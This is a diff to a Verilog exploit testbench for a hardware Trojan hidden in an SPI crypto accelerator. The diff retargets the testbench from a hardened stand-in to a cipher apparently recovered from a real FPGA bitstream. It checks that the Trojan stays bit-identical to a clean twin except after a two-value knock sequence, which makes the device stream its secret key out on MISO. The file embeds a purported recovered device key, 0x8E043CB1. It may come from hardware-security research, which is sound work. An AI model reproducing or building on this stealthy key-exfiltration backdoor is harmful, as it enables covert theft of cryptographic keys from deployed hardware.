@@ -1,6 +1,13 @@
 `timescale 1ns/1ps
 // ============================================================================
-//  tb_trojan.v  -  Exploit testbench for the HARDENED crypto_core Trojan.
+//  tb_trojan.v  -  Exploit testbench for the RECOVERED crypto_core Trojan.
+//
+//  This testbench is compiled against the RECOVERED cipher
+//  (crypto_core_recovered.v) - i.e. the exact byte-substitution engine lifted
+//  from the FPGA bitstream, NOT a recreated/hardened stand-in - so the exploit
+//  is demonstrated on the real device behaviour.  (recovery/equiv_netlist.py
+//  separately proves that recovered core is bit-exact to the gate-level netlist
+//  over random traffic, so a pass here is a pass on the recovered silicon.)
 //
 //  Two identical accelerators are driven in lock-step over the documented SPI
 //  interface (mode-0, MSB-first, unified SCK):
@@ -8,19 +15,20 @@
 //     REF = spi_crypto_top #(.TROJAN_EN(0))   <- clean twin (golden reference)
 //
 //  Proofs produced:
-//   (A) Functional  : encrypt/decrypt are exact inverses on the hardened cipher.
+//   (A) Functional  : encrypt/decrypt are exact inverses; reproduces the
+//                     published golden vector enc(0x59C359C3)=0x9CD84392.
 //   (B) Stealth     : for EVERY non-trigger transaction DUT output == REF output
 //                     (bit-identical); lone knocks and a broken/decrypt-mode
 //                     knock never leak.
 //   (C) Exploit     : after enc(KNOCK_1) then enc(KNOCK_2), DUT streams the
-//                     32-bit SECRET_KEY on MISO while REF returns the real
-//                     ciphertext -> the key is exfiltrated and the two diverge
-//                     only here.
+//                     32-bit RECOVERED device key 0x8E043CB1 on MISO while REF
+//                     returns the real ciphertext -> the genuine key is
+//                     exfiltrated and the two diverge only here.
 // ============================================================================
 module tb_trojan;
   localparam [31:0] KNOCK_1    = 32'hDEADC0DE;
   localparam [31:0] KNOCK_2    = 32'hFEEDFACE;
-  localparam [31:0] SECRET_KEY = 32'hC0DECAFE;
+  localparam [31:0] SECRET_KEY = 32'h8E043CB1;  // RECOVERED device key (recovery/recover_key.py)
 
   reg SCK=0, RST_N=1, MOSI=0, NORM_CS_N=1, START=0, ENC_DEC=0;
   wire MISO_D, BUSY_D, LED_D, MISO_R, BUSY_R, LED_R;
@@ -58,9 +66,11 @@ module tb_trojan;
   initial begin
     $dumpfile("tb_trojan.vcd"); $dumpvars(0,tb_trojan);
 
-    $display("=== (A) Functional: hardened encrypt/decrypt are inverse ===");
+    $display("=== (A) Functional: recovered encrypt/decrypt are inverse ===");
     reset; op(32'h59C359C3,1'b0); c=rxR;
-    $display("  enc(59C359C3)=%08x", c);
+    $display("  enc(59C359C3)=%08x  (expect golden 9CD84392)", c);
+    if (c===32'h9CD84392) $display("  [PASS] golden vector reproduced");
+    else begin errors=errors+1; $display("  [FAIL] golden vector: %08x", c); end
     op(c,1'b1);
     if (rxR===32'h59C359C3) $display("  [PASS] dec(enc)=59C359C3 (round-trip)");
     else begin errors=errors+1; $display("  [FAIL] round-trip: %08x", rxR); end
@@ -95,7 +105,7 @@ module tb_trojan;
     else begin errors=errors+1; $display("  [FAIL] no divergence at trigger"); end
     op(32'h59C359C3,1'b0); same("post-leak enc 59C359C3 normal");
 
-    if (errors==0) $display("\nTB_TROJAN: ALL PASS - hardened cipher, perfect stealth, key exfiltrated.");
+    if (errors==0) $display("\nTB_TROJAN: ALL PASS - recovered cipher, perfect stealth, device key 0x8E043CB1 exfiltrated.");
     else           $display("\nTB_TROJAN: %0d FAILURE(S).", errors);
     $finish;
   end
